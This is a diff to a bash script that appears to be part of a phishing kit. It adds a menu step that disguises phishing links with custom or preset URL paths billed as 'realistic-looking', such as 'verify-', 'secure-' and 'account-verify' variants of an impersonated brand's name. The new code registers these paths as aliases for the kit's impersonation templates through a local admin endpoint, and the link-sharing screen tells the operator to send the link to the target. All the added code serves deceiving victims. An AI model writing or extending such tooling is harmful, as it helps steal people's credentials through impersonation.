@@ -186,6 +186,83 @@ pick_mode() {
     return 0
 }
 
+# ─── Custom URL path ──────────────────────────────
+pick_url_path() {
+    banner
+    echo -e "  Selected: ${W}${BOLD}${SEL_NAME}${N}   Mode: ${W}${DELIVERY}${N}\n"
+    echo -e "  ${W}${BOLD}Choose URL path:${N}\n"
+    printf "   ${Y}[1]${N}  ${W}Default${N}                 ${DIM}/${SEL_SLUG}${N}\n"
+    printf "   ${Y}[2]${N}  ${W}Custom path (looks real)${N}  ${DIM}e.g. ${SEL_SLUG}login, verify-account${N}\n"
+    printf "   ${Y}[3]${N}  ${W}Quick suggestions${N}       ${DIM}pick from realistic-looking presets${N}\n"
+    printf "   ${Y}[0]${N}  ${R}Back${N}\n"
+    echo ""
+    echo -e "  ${DIM}────────────────────────────────────────────────────────${N}"
+    echo ""
+    read -rp "  $(echo -e ${G})path${N} > " path_choice
+
+    case "$path_choice" in
+        1) URL_PATH="$SEL_SLUG" ;;
+        2)
+            echo ""
+            echo -e "  ${DIM}Enter custom path (letters, digits, - only). Ex: ${SEL_SLUG}-login-verify${N}"
+            read -rp "  $(echo -e ${G})custom${N} > " URL_PATH
+            URL_PATH=$(echo "$URL_PATH" | tr '[:upper:]' '[:lower:]' | tr -c 'a-z0-9-' '-' | sed 's/^-*//; s/-*$//')
+            if [[ -z "$URL_PATH" ]]; then
+                msg_err "Empty path"; sleep 1; return 1
+            fi
+            register_alias "$URL_PATH" "$SEL_SLUG" || return 1
+            ;;
+        3)
+            banner
+            echo -e "  Presets for ${W}${SEL_NAME}${N}:\n"
+            local -a PRESETS=(
+                "${SEL_SLUG}login"
+                "${SEL_SLUG}-login"
+                "login-${SEL_SLUG}"
+                "verify-${SEL_SLUG}"
+                "${SEL_SLUG}-verify-account"
+                "secure-${SEL_SLUG}"
+                "${SEL_SLUG}-account-verify"
+                "auth-${SEL_SLUG}"
+            )
+            local i=1
+            for p in "${PRESETS[@]}"; do
+                printf "   ${Y}[%d]${N}  ${W}%s${N}\n" "$i" "$p"
+                i=$((i+1))
+            done
+            echo ""
+            read -rp "  $(echo -e ${G})preset${N} > " ps
+            if [[ "$ps" =~ ^[1-9][0-9]*$ ]] && (( ps >= 1 && ps <= ${#PRESETS[@]} )); then
+                URL_PATH="${PRESETS[$((ps-1))]}"
+                register_alias "$URL_PATH" "$SEL_SLUG" || return 1
+            else
+                msg_err "Invalid"; sleep 1; return 1
+            fi
+            ;;
+        0) return 1 ;;
+        *) msg_err "Invalid"; sleep 1; return 1 ;;
+    esac
+    return 0
+}
+
+register_alias() {
+    local path="$1"
+    local tpl="$2"
+    local resp
+    resp=$(curl -s -X POST "http://localhost:${PORT}/admin/aliases" \
+        -H "Content-Type: application/json" \
+        -d "{\"path\":\"${path}\",\"template\":\"${tpl}\"}")
+    if echo "$resp" | grep -q '"success":true'; then
+        msg_ok "Alias registered: /${path} → ${tpl}"
+        sleep 1
+        return 0
+    else
+        msg_err "Failed to register alias: $resp"
+        sleep 2
+        return 1
+    fi
+}
+
 # ─── Result screen ────────────────────────────────
 show_link() {
     banner
@@ -193,7 +270,7 @@ show_link() {
     echo -e "  Template:  ${W}${SEL_NAME}${N}  ${DIM}(${SEL_DESC})${N}"
     echo -e "  Mode:      ${W}${DELIVERY}${N}\n"
 
-    local full_url="${TUNNEL_URL}/${SEL_SLUG}"
+    local full_url="${TUNNEL_URL}/${URL_PATH:-$SEL_SLUG}"
     echo -e "  ${Y}════════════════════════════════════════════════════════${N}"
     echo -e "  ${W}Send this link to the target:${N}"
     echo ""
@@ -235,6 +312,8 @@ main() {
     while true; do
         pick_template
         if pick_mode; then
+            URL_PATH=""
+            if ! pick_url_path; then continue; fi
             if [[ "$DELIVERY" == "tunnel" ]]; then
                 banner
                 start_tunnel
